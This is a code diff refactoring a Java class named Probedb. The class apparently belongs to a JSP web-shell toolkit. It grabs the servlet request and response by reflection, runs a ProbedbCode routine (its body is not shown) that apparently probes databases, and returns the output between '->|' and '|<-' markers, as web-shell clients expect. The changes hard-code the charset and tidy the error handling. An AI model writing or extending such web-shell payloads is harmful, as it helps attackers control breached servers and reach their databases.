@@ -1,3 +1,5 @@
+package base;
+
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Field;
@@ -13,7 +15,7 @@ public class Probedb {
             Class clazz = Class.forName("javax.servlet.jsp.PageContext");
             request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
             response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-        } catch (Exception ex) {
+        } catch (Exception e) {
             if (obj instanceof HttpServletRequest) {
                 request = (HttpServletRequest) obj;
                 try {
@@ -23,46 +25,31 @@ public class Probedb {
                     Field resp = request2.getClass().getDeclaredField("response");
                     resp.setAccessible(true);
                     response = (HttpServletResponse) resp.get(request2);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                } catch (Exception ex) {
+                    try {
+                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                    } catch (Exception ignored) {
 
-            } else if (obj instanceof HttpServletResponse) {
-                response = (HttpServletResponse) obj;
-                try {
-                    Field resp = response.getClass().getDeclaredField("response");
-                    resp.setAccessible(true);
-                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
-                    Field req = response2.getClass().getDeclaredField("request");
-                    req.setAccessible(true);
-                    request = (HttpServletRequest) req.get(response2);
-                } catch (Exception e) {
-                    e.printStackTrace();
+                    }
                 }
             }
         }
 
+        cs = "UTF-8";
         StringBuffer output = new StringBuffer("");
-        StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
-        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            output.append(tag_s);
-            sb.append(ProbedbCode(request));
-            output.append(sb.toString());
-            output.append(tag_e);
-            response.getWriter().print(output.toString());
+            output.append(ProbedbCode(request));
         } catch (Exception e) {
-            sb.append(tag_s + "ERROR" + ":// " + e.toString() + tag_e);
-            try {
-                response.getWriter().print(sb.toString());
-            } catch (Exception ex) {
-
-            }
+            output.append("ERROR:// " + e.toString());
+        }
+        try {
+            response.getWriter().print(tag_s + output.toString() + tag_e);
+        } catch (Exception ignored) {
         }
         return true;
     }
